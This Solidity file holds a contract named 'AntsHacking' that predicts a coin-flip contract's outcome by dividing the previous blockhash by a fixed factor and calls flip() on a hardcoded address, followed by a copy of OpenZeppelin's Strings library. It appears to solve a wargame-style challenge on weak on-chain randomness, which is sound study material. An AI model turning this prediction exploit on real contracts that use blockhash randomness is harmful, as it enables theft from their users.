pragma solidity ^0.8.7;

import "@openzeppelin/contracts/utils/Strings.sol";

interface FlipHacker {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns(uint256);
}

contract AntsHacking {
    uint256 hack_factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor() {}

    function cheat_flip() external returns (string memory) {
        bool cheat_guess;
        uint256 iKnowTheBlockValue = uint256(blockhash(block.number - 1));
        if (iKnowTheBlockValue / hack_factor == 1)
        {
            cheat_guess = true;
            FlipHacker(0x7E06570135e9B3D99Cf297A67Eba7672fB6c39e3).flip(cheat_guess);
            return string(abi.encodePacked("you guessed true because block value is ", Strings.toString(iKnowTheBlockValue)));
        }
        if (iKnowTheBlockValue / hack_factor == 0)
        {
            cheat_guess = false;
            FlipHacker(0x7E06570135e9B3D99Cf297A67Eba7672fB6c39e3).flip(cheat_guess);
            return string(abi.encodePacked("you guessed false because block value is ", Strings.toString(iKnowTheBlockValue)));
        }
        if (iKnowTheBlockValue / hack_factor != 1 && iKnowTheBlockValue / hack_factor != 0)
        {
            return string(abi.encodePacked("prolly an error, block/factor was guessed as ", Strings.toString(iKnowTheBlockValue/hack_factor)));
        }
        

    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/Strings.sol)

pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
    uint8 private constant _ADDRESS_LENGTH = 20;

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        // Inspired by OraclizeAPI's implementation - MIT licence
        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
     */
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    /**
     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.
     */
    function toHexString(address addr) internal pure returns (string memory) {
        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
    }
}